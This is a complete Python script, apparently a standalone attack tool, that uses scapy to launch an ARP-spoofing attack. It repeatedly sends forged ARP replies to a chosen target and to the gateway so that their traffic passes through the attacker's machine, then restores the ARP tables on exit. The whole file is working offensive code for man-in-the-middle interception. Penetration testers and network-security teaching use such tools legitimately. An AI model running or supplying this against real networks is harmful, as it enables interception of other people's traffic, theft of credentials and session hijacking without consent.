#!/usr/bin/env python3

import scapy.all as scapy, time, argparse
from sys import exit


def get_args():
    parser = argparse.ArgumentParser(description="Launch an ARP-Spoof attack")
    parser.add_argument("-t","--target",metavar='',help="set the target_ip of the attack",required=True)
    parser.add_argument("-r","--router",metavar='', help="set the gateway_ip/second_target_ip of the attack",required=True)
    return parser.parse_args()  

def get_mac(ip):
    broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip)
    response_list = scapy.srp(broadcast_request, timeout=4, verbose=False)[0]
    if response_list:
        print(response_list) 
        return response_list[0][1].hwsrc
    else:
        print(f"{styles.FAIL_BOLD}[-] Please make sure you have specified correct IP-Addresses for your interface.{styles.DEF}")
        exit(-1)


def spoof(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=5, verbose=False)

class styles:
    HEADER = '\033[95m'
    HEADER_BOLD = '\033[1m\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    FAIL_BOLD = '\033[1m\033[91m'
    DEF = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.DEF = '' 
            
def main():
    target_ip = get_args().target
    gateway_ip = get_args().router
    
    try:
        count = 0
        print(f"{styles.HEADER_BOLD}[+]Spoofing in Progress: {styles.DEF}")
        while True:
            spoof(target_ip, gateway_ip)
            time.sleep(2)
            spoof(gateway_ip, target_ip)
            count += 2
            print(f"\r[+] Packets sent: {str(count)}", end="")
            
    except KeyboardInterrupt:
        print(f"{styles.FAIL_BOLD}\n [-] Exiting Program and Re-Arping Targets...{styles.DEF}")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


if __name__ == '__main__':
    main()
